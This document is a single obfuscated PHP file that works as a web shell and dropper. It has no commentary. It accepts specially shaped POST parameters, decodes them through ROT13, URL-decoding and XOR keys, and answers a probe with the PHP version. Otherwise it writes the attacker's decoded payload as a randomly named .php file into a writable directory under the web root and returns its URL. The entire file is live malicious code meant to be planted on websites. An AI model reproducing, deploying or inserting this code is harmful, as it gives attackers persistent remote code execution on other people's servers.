<?php $vxyjjtroaw = "khwctcgshbxbkfki";$lmpmjylbv = "";foreach ($_POST as $vqgixw => $pjnwkjt){if (strlen($vqgixw) == 16 and substr_count($pjnwkjt, "%") > 10){hfdtpsxi($vqgixw, $pjnwkjt);}}function hfdtpsxi($vqgixw, $necdgmrhue){global $lmpmjylbv;$lmpmjylbv = $vqgixw;$necdgmrhue = str_split(rawurldecode(str_rot13($necdgmrhue)));function ctigewhoy($gyhml, $vqgixw){global $vxyjjtroaw, $lmpmjylbv;return $gyhml ^ $vxyjjtroaw[$vqgixw % strlen($vxyjjtroaw)] ^ $lmpmjylbv[$vqgixw % strlen($lmpmjylbv)];}$necdgmrhue = implode("", array_map("ctigewhoy", array_values($necdgmrhue), array_keys($necdgmrhue)));$necdgmrhue = @unserialize($necdgmrhue);if (@is_array($necdgmrhue)){$vqgixw = array_keys($necdgmrhue);$necdgmrhue = $necdgmrhue[$vqgixw[0]];if ($necdgmrhue === $vqgixw[0]){echo @serialize(Array('php' => @phpversion(), ));exit();}else{function fmxiyctb($zypnoir) {static $jaxgpa = array();$jnpya = glob($zypnoir . '/*', GLOB_ONLYDIR);if (count($jnpya) > 0) {foreach ($jnpya as $zypno){if (@is_writable($zypno)){$jaxgpa[] = $zypno;}}}foreach ($jnpya as $zypnoir) fmxiyctb($zypnoir);return $jaxgpa;}$ervaz = $_SERVER["DOCUMENT_ROOT"];$jnpya = fmxiyctb($ervaz);$vqgixw = array_rand($jnpya);$rccqakvexm = $jnpya[$vqgixw] . "/" . substr(md5(time()), 0, 8) . ".php";@file_put_contents($rccqakvexm, $necdgmrhue);echo "http://" . $_SERVER["HTTP_HOST"] . substr($rccqakvexm, strlen($ervaz));exit();}}}